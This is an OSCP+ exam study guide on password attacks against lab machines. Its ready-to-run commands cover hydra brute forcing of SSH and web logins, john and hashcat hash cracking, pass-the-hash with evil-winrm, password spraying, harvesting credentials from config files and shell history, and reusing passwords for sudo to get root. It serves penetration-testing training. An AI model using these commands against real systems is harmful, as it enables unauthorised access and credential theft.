## 1. What “password attacks” mean in OSCP+

In OSCP+, password attacks are **not just brute force**.

They are about:

- Finding credentials **anywhere**
    
- Reusing them **everywhere**
    
- Abusing weak authentication **silently**
    
- Pivoting from passwords → shells → root
    

OSCP mindset:

> Passwords are **pivot points**, not the final goal.

---

## 2. Main password attack categories (exam-relevant)

### 1️⃣ Online attacks

➡️ Attacking **live services**

### 2️⃣ Offline attacks

➡️ Cracking **captured hashes**

### 3️⃣ Credential reuse & spraying

➡️ One password, many services

### 4️⃣ Default / weak credentials

➡️ Easiest wins

### 5️⃣ Password exposure

➡️ Files, configs, scripts, memory

You will usually chain **multiple types** in one machine.

---

## 3. Online Password Attacks (live services)

### Targets you’ll see in OSCP+

- SSH
    
- FTP
    
- SMB
    
- HTTP login forms
    
- MySQL / PostgreSQL
    

⚠️ OSCP rule:

> **No noisy brute forcing**. Be smart and targeted.

---

### Practical #1: SSH password attack (targeted)

```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.5
```

Better (targeted wordlist):

```bash
hydra -l admin -P small.txt ssh://10.10.10.5
```

OSCP tip:

- Try **usernames you already found**
    
- Reduce wordlists
    
- Avoid lockouts
    

---

### Practical #2: HTTP login form

Intercept login with Burp → identify parameters.

```bash
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Invalid"
```

🔥 Common OSCP win:

- Error message leaks success/failure
    
- No rate limiting
    

---

## 4. Offline Password Attacks (MOST IMPORTANT)

Offline = **no detection, no limits**.

### Where hashes come from

- `/etc/shadow`
    
- Database dumps
    
- Config backups
    
- LFI / RFI
    
- Windows SAM
    
- Web app leaks
    

---

### Practical #3: Linux `/etc/shadow`

Example:

```text
john:$6$salt$hash
```

Crack:

```bash
john --wordlist=rockyou.txt shadow.txt
```

Show results:

```bash
john --show shadow.txt
```

Then:

```bash
ssh john@10.10.10.5
```

---

### Practical #4: Windows NTLM hashes

Crack:

```bash
hashcat -m 1000 ntlm.txt rockyou.txt
```

OR skip cracking (🔥 OSCP favorite):

```bash
evil-winrm -i 10.10.10.5 -u Administrator -H <NTLM_HASH>
```

This is **pass-the-hash**.

---

## 5. Credential Reuse (HUGE OSCP POINTS)

### Rule

> If a password works once — try it everywhere.

Example:

```text
webadmin : summer2023
```

Try on:

```bash
ssh webadmin@10.10.10.5
ftp webadmin@10.10.10.5
mysql -u webadmin -p
sudo -l
```

OSCP reality:

- Users reuse passwords constantly
    
- Root often uses same password
    

---

## 6. Password Spraying (safe & effective)

### What it is

- One password
    
- Many users
    
- Avoids lockouts
    

Example:

```bash
hydra -L users.txt -p Welcome1 ssh://10.10.10.5
```

Better:

```bash
crackmapexec smb 10.10.10.5 -u users.txt -p Password123
```

OSCP loves spraying because it’s **quiet**.

---

## 7. Default & Weak Credentials (FREE POINTS)

Always try:

```text
admin:admin
admin:password
root:root
test:test
```

Services to check:

- WordPress
    
- phpMyAdmin
    
- Tomcat
    
- Jenkins
    
- SMB
    
- FTP
    

Example:

```bash
mysql -u root -p
# Try blank password
```

---

## 8. Passwords in Files (EXTREMELY COMMON)

### Where to look

```bash
grep -Ri "password" /var/www/
grep -Ri "pass" /etc/
```

Check:

- `.env`
    
- `config.php`
    
- `wp-config.php`
    
- `.bak`
    
- `.old`
    

Example:

```php
$db_pass = "P@ssw0rd!";
```

Try it:

```bash
ssh user@10.10.10.5
```

---

## 9. Passwords in Command History

```bash
cat ~/.bash_history
```

You’ll see:

```bash
mysql -u root -pP@ssw0rd!
```

🔥 Instant root.

---

## 10. Passwords in Memory (advanced OSCP+)

On Linux:

```bash
ps aux
strings /proc/<pid>/cmdline
```

On Windows:

- mimikatz (post-exploitation)
    

---

## 11. Password Attacks → Privilege Escalation

Very common flow:

1. Crack user password
    
2. `sudo -l`
    
3. Password reused for sudo
    
4. Root shell
    

Example:

```bash
sudo -l
[sudo] password for user:
```

Try cracked password → **root**

---

## 12. OSCP-Style Password Attack Chain

```text
LFI → config.php → DB creds
↓
DB dump → password hashes
↓
Hash crack → plaintext
↓
SSH login
↓
sudo reuse
↓
root
```

Passwords are **connective tissue**.

---

## 13. Common OSCP mistakes (avoid these)

❌ Only trying brute force  
❌ Ignoring credential reuse  
❌ Forgetting pass-the-hash  
❌ Not checking config files  
❌ Not trying cracked passwords for sudo

---

## 14. OSCP+ Password Attack Checklist

✔ Enumerate users  
✔ Look for plaintext passwords  
✔ Dump hashes  
✔ Crack offline  
✔ Reuse credentials everywhere  
✔ Attempt pass-the-hash  
✔ Try sudo with same password

---

## 15. Practice challenge (do this)

You find:

```text
admin:$1$xyz$4fTgjpKkLZf0QZ
```

Steps:

1. Identify hash
    
2. Crack with John
    
3. SSH as admin
    
4. Check `sudo -l`
    

That’s **literally OSCP logic**.

---

